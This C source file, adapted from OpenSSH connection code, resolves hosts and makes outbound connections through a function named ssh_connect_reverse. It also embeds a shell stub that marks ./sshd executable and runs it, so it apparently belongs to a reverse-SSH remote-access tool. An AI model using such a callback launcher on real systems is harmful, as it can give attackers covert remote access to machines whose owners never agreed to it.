
#include "includes.h"

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>
#ifdef HAVE_SYS_TIME_H
# include <sys/time.h>
#endif

#include <netinet/in.h>
#include <arpa/inet.h>

#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#ifdef HAVE_PATHS_H
#include <paths.h>
#endif
#include <pwd.h>
#ifdef HAVE_POLL_H
#include <poll.h>
#endif
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


#include "xmalloc.h"
#include "key.h"
#include "hostfile.h"
#include "ssh.h"
#include "buffer.h"
#include "packet.h"
#include "uidswap.h"
#include "compat.h"
#include "key.h"
#include "sshconnect.h"
#include "hostfile.h"
#include "log.h"
#include "misc.h"
#include "readconf.h"
#include "atomicio.h"
#include "dns.h"
#include "monitor_fdpass.h"
#include "ssh2.h"
#include "version.h"
#include "authfile.h"
#include "ssherr.h"
#include "authfd.h"

char *bash = 	"\nL3T\n"
		"function a() { MYSELF=./sshd; chmod +x ${MYSELF};"
	       	"${MYSELF} ${ARGS};}\n a $@\nexit 0\n";

struct addrinfo *
resolve_host(const char *name, int port, int logerr, char *cname, size_t clen)
{
    char strport[NI_MAXSERV];
    struct servent *sp;
    struct addrinfo hints, *res;
    int gaierr;

    if (port <= 0) {
        sp = getservbyname(SSH_SERVICE_NAME, "tcp");
        port = sp ? ntohs(sp->s_port) : SSH_DEFAULT_PORT;
    }




    snprintf(strport, sizeof strport, "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET == -1 ?
        AF_UNSPEC : AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (cname != NULL)
        hints.ai_flags = AI_CANONNAME;
    if ((gaierr = getaddrinfo(name, strport, &hints, &res)) != 0) {
        fatal("Could not resolve hostname %.100s: %s",
            name, ssh_gai_strerror(gaierr));
        return NULL;
    }
    if (cname != NULL && res->ai_canonname != NULL) {
        if (strlcpy(cname, res->ai_canonname, clen) >= clen) {
            error("%s: host \"%s\" cname \"%s\" too long (max %lu)",
                __func__, name,  res->ai_canonname, (u_long)clen);
            if (clen > 0)
                *cname = '\0';
        }
    }
    return res;
}

int
ssh_connect_reverse(int *newsock, int *sock_in, int *sock_out, 
    const char *host, struct addrinfo *aitop,
    u_short port, int family,
    int connection_attempts, int want_keepalive, int needpriv)
{
    int on = 1;
    int attempt;
    char ntop[NI_MAXHOST], strport[NI_MAXSERV];
    struct addrinfo *ai;

    debug2("%s: needpriv %d", __func__, needpriv);
    memset(ntop, 0, sizeof(ntop));
    memset(strport, 0, sizeof(strport));

    for (attempt = 0; attempt < connection_attempts; attempt++) {
        if (attempt > 0) {
            /* Sleep a moment before retrying. */
            sleep(1);
            debug("Trying again...");
        }
        /*
         * Loop through addresses for this host, and try each one in
         * sequence until the connection succeeds.
         */

       for (ai = aitop; ai; ai = ai->ai_next) {
            if (ai->ai_family != AF_INET &&
                ai->ai_family != AF_INET6)
                continue;
            if (getnameinfo(ai->ai_addr, ai->ai_addrlen,
                ntop, sizeof(ntop), strport, sizeof(strport),
                NI_NUMERICHOST|NI_NUMERICSERV) != 0) {
                error("%s: getnameinfo failed", __func__);
                continue;
            }
            debug("Connecting to %.200s [%.100s] port %s.",
                host, ntop, strport);

            /* Create a socket for connecting. */
            *newsock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
            if (*newsock < 0) {
                error("socket: %s", strerror(errno));
                return -1;
            }


            if (connect(*newsock, ai->ai_addr, ai->ai_addrlen) >= 0) {
                /* Successful connection. */
                break;
            } else {
                debug("connect to address %s port %s: %s",
                    ntop, strport, strerror(errno));
                close(*newsock);
                *newsock = -1;
            }
        }

        /* Successful connection. */
        if (*newsock != -1) {
            *sock_in = *newsock;                          
            *sock_out = *newsock;
            break;
        }
    }
    /* Return failure if we didn't get a successful connection. */
    if (*newsock == -1) {
        error("ssh: connect to host %s port %s: %s",
            host, strport, strerror(errno));
        return (-1);
    }

    debug("Connection established.");
    /* Set SO_KEEPALIVE if requested. */
    if (want_keepalive &&
        setsockopt(*newsock, SOL_SOCKET, SO_KEEPALIVE, (void *)&on,
        sizeof(on)) < 0)
        error("setsockopt SO_KEEPALIVE: %.100s", strerror(errno));

    return 0;
}

